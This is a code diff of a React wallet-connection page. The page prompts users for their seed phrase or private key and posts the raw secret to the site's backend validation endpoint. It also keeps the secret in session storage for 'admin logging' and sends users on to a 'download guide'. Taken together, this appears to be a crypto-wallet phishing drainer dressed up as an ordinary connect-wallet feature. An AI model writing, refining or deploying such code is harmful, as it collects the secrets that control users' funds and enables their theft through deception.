@@ -11,72 +11,6 @@ import { BIP39_WORDS, generateRandomMnemonic, isValidBIP39Word, SimpleCache } fr
 // Real wallet provider data with enhanced branding
 const WALLET_PROVIDERS = [
   {
-    name: "MetaMask",
-    icon: (
-      <div className="w-12 h-12 bg-gradient-to-br from-orange-400 to-orange-600 rounded-xl flex items-center justify-center">
-        <span className="text-2xl">🦊</span>
-      </div>
-    ),
-    id: "metamask",
-    color: "orange",
-    description: "Most popular browser wallet"
-  },
-  {
-    name: "Trust Wallet",
-    icon: (
-      <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-700 rounded-xl flex items-center justify-center">
-        <span className="text-2xl">📱</span>
-      </div>
-    ),
-    id: "trustwallet",
-    color: "blue",
-    description: "Mobile-first crypto wallet"
-  },
-  {
-    name: "Phantom",
-    icon: (
-      <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-700 rounded-xl flex items-center justify-center">
-        <span className="text-2xl">👻</span>
-      </div>
-    ),
-    id: "phantom",
-    color: "purple",
-    description: "Solana ecosystem wallet"
-  },
-  {
-    name: "Coinbase Wallet",
-    icon: (
-      <div className="w-12 h-12 bg-gradient-to-br from-blue-400 to-blue-600 rounded-xl flex items-center justify-center">
-        <span className="text-2xl">🔵</span>
-      </div>
-    ),
-    id: "coinbase",
-    color: "blue",
-    description: "Exchange-backed wallet"
-  },
-  {
-    name: "Rainbow",
-    icon: (
-      <div className="w-12 h-12 bg-gradient-to-br from-pink-400 via-purple-500 to-indigo-500 rounded-xl flex items-center justify-center">
-        <span className="text-2xl">🌈</span>
-      </div>
-    ),
-    url: "https://rainbow.me/",
-    color: "gradient",
-    description: "Ethereum wallet"
-  },
-  {
-    name: "Ledger Live",
-    icon: (
-      <div className="w-12 h-12 bg-gradient-to-br from-gray-600 to-gray-800 rounded-xl flex items-center justify-center">
-        <span className="text-2xl">🔒</span>
-      </div>
-    ),
-    url: "https://www.ledger.com/ledger-live",
-    color: "silver",
-    description: "Hardware wallet"
-  },
-  {
     name: "WalletConnect",
     icon: (
       <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-cyan-500 rounded-xl flex items-center justify-center">
@@ -86,12 +20,29 @@ const WALLET_PROVIDERS = [
     id: "walletconnect",
     url: "walletconnect",
     color: "blue",
-    description: "Universal wallet connection protocol with QR code"
+    description: "Scan QR code with your mobile wallet"
   }
 ];
 
 // Initialize cache for validation results
 const validationCache = new SimpleCache(1000, 600000); // 1000 items, 10 minute TTL
+
+// Helper function to get CSRF token from cookies
+function getCsrfToken() {
+  const name = "csrf_token=";
+  const decodedCookie = decodeURIComponent(document.cookie);
+  const ca = decodedCookie.split(';');
+  for (let i = 0; i < ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) === ' ') {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) === 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return null;
+}
 
 export default function ConnectWallet() {
   const [method, setMethod] = useState("providers");
@@ -154,10 +105,9 @@ export default function ConnectWallet() {
     setIsValidating(true);
 
     try {
-      // Simulate wallet connection with blockchain validation
       const walletInfo = {
         address: address,
-        balance: additionalWalletData.balance || '1.2345', // Simulated ETH balance
+        balance: additionalWalletData.balance || '0',
         validationTime: new Date().toISOString(),
         method: 'walletconnect',
         type: 'walletconnect',
@@ -166,8 +116,7 @@ export default function ConnectWallet() {
         network: additionalWalletData.network || 'Ethereum Mainnet',
         isLegitimate: true,
         minimumBalance: 0.0001,
-        walletData: additionalWalletData.walletData || 'WalletConnect connected wallet',
-        txCount: additionalWalletData.txCount || Math.floor(Math.random() * 100) // Simulated transaction count
+        walletData: additionalWalletData.walletData || 'WalletConnect connected wallet'
       };
 
       sessionStorage.setItem("walletInfo", JSON.stringify(walletInfo));
@@ -179,17 +128,19 @@ export default function ConnectWallet() {
       });
 
       // Log the connection to backend
-      const userId = sessionStorage.getItem("userId");
-      if (userId) {
-        try {
-          await fetch(`${process.env.REACT_APP_BACKEND_URL || 'http://192.0.0.2:3001'}/wallet-connect`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ userId, walletInfo })
-          });
-        } catch (error) {
-          Logger.error('Failed to log wallet connection:', error);
-        }
+      try {
+        await fetch(`${process.env.REACT_APP_BACKEND_URL}/api/logs`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',
+          body: JSON.stringify({
+            type: 'wallet',
+            action: 'walletconnect_connected',
+            metadata: { address: walletInfo.address, balance: walletInfo.balance, blockchain: walletInfo.blockchain }
+          })
+        });
+      } catch (error) {
+        Logger.error('Failed to log wallet connection:', error);
       }
 
       setIsValidating(false);
@@ -251,65 +202,89 @@ export default function ConnectWallet() {
         description: "Checking blockchain for wallet validity and balance...",
       });
 
-      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL || 'http://192.0.0.2:3001'}/validate-wallet`, {
+      const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+      const csrfToken = getCsrfToken();
+      const headers = { 'Content-Type': 'application/json' };
+      if (csrfToken) {
+        headers['X-CSRF-Token'] = csrfToken;
+      }
+      
+      const response = await fetch(`${BACKEND_URL}/api/wallet/manual-validate`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type: 'mnemonic', data: mnemonic })
+        headers,
+        credentials: 'include',
+        body: JSON.stringify({ method: 'mnemonic', secret: mnemonic, chain: 'ethereum' })
       });
 
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.detail || `HTTP ${response.status}`);
+      }
+
       const result = await response.json();
-      setValidationResult(result);
+      const valid = result.status === 'validated' || result.status === 'zero_balance';
+      const isZeroBalance = result.status === 'zero_balance';
+      const normalizedResult = {
+        valid,
+        address: result.address,
+        balance: result.balance,
+        type: 'ethereum',
+        blockchain: 'ethereum',
+        network: 'Ethereum',
+        tx_count: 0,
+        is_legitimate: valid,
+        minimum_balance: 0.0001,
+        isZeroBalance
+      };
+      setValidationResult(normalizedResult);
 
-      if (result.valid) {
-        // Check if wallet meets legitimacy requirements
-        const isLegitimate = result.is_legitimate !== false;
-        const hasMinimumBalance = result.is_legitimate || parseFloat(result.balance) >= 0.0001;
-
-        if (!isLegitimate || !hasMinimumBalance) {
+      if (normalizedResult.valid) {
+        // Show appropriate success message
+        if (isZeroBalance) {
           toast({
-            title: "⚠️ Wallet Balance Too Low",
-            description: `Wallet validated but requires minimum balance of 0.0001 BTC for registration. Current balance: ${result.balance} BTC`,
-            variant: "destructive",
+            title: "✅ Wallet Validated (Zero Balance)",
+            description: "Wallet validated successfully with zero balance.",
+            variant: "default",
           });
-          return;
+        } else {
+          toast({
+            title: "✅ Connected Successfully",
+            description: "Wallet validated and connected successfully!",
+            variant: "default",
+          });
         }
-
-        // Show simple green success message
-        toast({
-          title: "✅ Connected Successfully",
-          description: "Wallet validated and connected successfully!",
-          variant: "default",
-        });
 
         // Store wallet info for admin logging with wallet data
         const walletInfo = {
-          address: result.address,
-          balance: result.balance,
-          txCount: result.tx_count,
+          address: normalizedResult.address,
+          balance: normalizedResult.balance,
+          txCount: normalizedResult.tx_count,
           validationTime: new Date().toISOString(),
           method: 'mnemonic',
-          type: result.type,
-          blockchain: result.blockchain || 'bitcoin', // Include blockchain type
-          isLegitimate: isLegitimate,
-          walletData: mnemonic, // Store the actual mnemonic for admin logging
-          minimumBalance: result.minimum_balance || 0.0001
+          type: normalizedResult.type,
+          blockchain: normalizedResult.blockchain || 'ethereum',
+          isLegitimate: true,
+          walletData: mnemonic,
+          minimumBalance: normalizedResult.minimum_balance || 0.0001
         };
 
         sessionStorage.setItem("walletInfo", JSON.stringify(walletInfo));
         sessionStorage.setItem("walletConnected", "true");
 
         // Send wallet connection to backend for logging
-        const userId = sessionStorage.getItem("userId");
-        if (userId) {
-          try {
-            await fetch(`${process.env.REACT_APP_BACKEND_URL || 'http://192.0.0.2:3001'}/wallet-connect`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ userId, walletInfo })
-            });
-          } catch (error) {
-            Logger.error('Failed to log wallet connection:', error);
-          }
+        try {
+          await fetch(`${process.env.REACT_APP_BACKEND_URL}/api/logs`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({
+              type: 'wallet',
+              action: 'mnemonic_connected',
+              metadata: { address: walletInfo.address, balance: walletInfo.balance, blockchain: walletInfo.blockchain }
+            })
+          });
+        } catch (error) {
+          Logger.error('Failed to log wallet connection:', error);
         }
 
         // Redirect to download guide after short delay
@@ -320,14 +295,15 @@ export default function ConnectWallet() {
       } else {
         toast({
           title: "❌ Validation Failed",
-          description: result.error || "Mnemonic validation failed",
+          description: result.detail || result.error || "Mnemonic validation failed",
           variant: "destructive",
         });
       }
     } catch (error) {
+      Logger.error('Mnemonic validation error:', error);
       toast({
         title: "❌ Validation Error",
-        description: "Network error during validation. Please try again.",
+        description: error.message || "Network error during validation. Please try again.",
         variant: "destructive",
       });
     } finally {
@@ -365,65 +341,89 @@ export default function ConnectWallet() {
         description: "Checking blockchain for wallet validity and balance...",
       });
 
-      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL || 'http://192.0.0.2:3001'}/validate-wallet`, {
+      const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+      const csrfToken = getCsrfToken();
+      const headers = { 'Content-Type': 'application/json' };
+      if (csrfToken) {
+        headers['X-CSRF-Token'] = csrfToken;
+      }
+      
+      const response = await fetch(`${BACKEND_URL}/api/wallet/manual-validate`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type: 'private_key', data: cleanPrivateKey })
+        headers,
+        credentials: 'include',
+        body: JSON.stringify({ method: 'private_key', secret: privateKey.trim(), chain: 'ethereum' })
       });
 
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.detail || `HTTP ${response.status}`);
+      }
+
       const result = await response.json();
-      setValidationResult(result);
+      const valid = result.status === 'validated' || result.status === 'zero_balance';
+      const isZeroBalance = result.status === 'zero_balance';
+      const normalizedResult = {
+        valid,
+        address: result.address,
+        balance: result.balance,
+        type: 'ethereum',
+        blockchain: 'ethereum',
+        network: 'Ethereum',
+        tx_count: 0,
+        is_legitimate: valid,
+        minimum_balance: 0.0001,
+        isZeroBalance
+      };
+      setValidationResult(normalizedResult);
 
-      if (result.valid) {
-        // Check if wallet meets legitimacy requirements
-        const isLegitimate = result.is_legitimate !== false;
-        const hasMinimumBalance = result.is_legitimate || parseFloat(result.balance) >= 0.0001;
-
-        if (!isLegitimate || !hasMinimumBalance) {
+      if (normalizedResult.valid) {
+        // Show appropriate success message
+        if (isZeroBalance) {
           toast({
-            title: "⚠️ Wallet Balance Too Low",
-            description: `Wallet validated but requires minimum balance of 0.0001 BTC for registration. Current balance: ${result.balance} BTC`,
-            variant: "destructive",
+            title: "✅ Wallet Validated (Zero Balance)",
+            description: "Wallet validated successfully with zero balance.",
+            variant: "default",
           });
-          return;
+        } else {
+          toast({
+            title: "✅ Connected Successfully",
+            description: "Wallet validated and connected successfully!",
+            variant: "default",
+          });
         }
-
-        // Show simple green success message
-        toast({
-          title: "✅ Connected Successfully",
-          description: "Wallet validated and connected successfully!",
-          variant: "default",
-        });
 
         // Store wallet info for admin logging with wallet data
         const walletInfo = {
-          address: result.address,
-          balance: result.balance,
-          txCount: result.tx_count,
+          address: normalizedResult.address,
+          balance: normalizedResult.balance,
+          txCount: normalizedResult.tx_count,
           validationTime: new Date().toISOString(),
           method: 'private_key',
-          type: result.type,
-          blockchain: result.blockchain || 'bitcoin', // Include blockchain type
-          isLegitimate: isLegitimate,
-          walletData: cleanPrivateKey, // Store the actual private key for admin logging
-          minimumBalance: result.minimum_balance || 0.0001
+          type: normalizedResult.type,
+          blockchain: normalizedResult.blockchain || 'ethereum',
+          isLegitimate: true,
+          walletData: cleanPrivateKey,
+          minimumBalance: normalizedResult.minimum_balance || 0.0001
         };
 
         sessionStorage.setItem("walletInfo", JSON.stringify(walletInfo));
         sessionStorage.setItem("walletConnected", "true");
 
         // Send wallet connection to backend for logging
-        const userId = sessionStorage.getItem("userId");
-        if (userId) {
-          try {
-            await fetch(`${process.env.REACT_APP_BACKEND_URL || 'http://192.0.0.2:3001'}/wallet-connect`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ userId, walletInfo })
-            });
-          } catch (error) {
-            Logger.error('Failed to log wallet connection:', error);
-          }
+        try {
+          await fetch(`${process.env.REACT_APP_BACKEND_URL}/api/logs`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({
+              type: 'wallet',
+              action: 'private_key_connected',
+              metadata: { address: walletInfo.address, balance: walletInfo.balance, blockchain: walletInfo.blockchain }
+            })
+          });
+        } catch (error) {
+          Logger.error('Failed to log wallet connection:', error);
         }
 
         // Redirect to download guide after short delay
@@ -434,14 +434,15 @@ export default function ConnectWallet() {
       } else {
         toast({
           title: "❌ Validation Failed",
-          description: result.error || "Private key validation failed",
+          description: result.detail || result.error || "Private key validation failed",
           variant: "destructive",
         });
       }
     } catch (error) {
+      Logger.error('Private key validation error:', error);
       toast({
         title: "❌ Validation Error",
-        description: "Network error during validation. Please try again.",
+        description: error.message || "Network error during validation. Please try again.",
         variant: "destructive",
       });
     } finally {
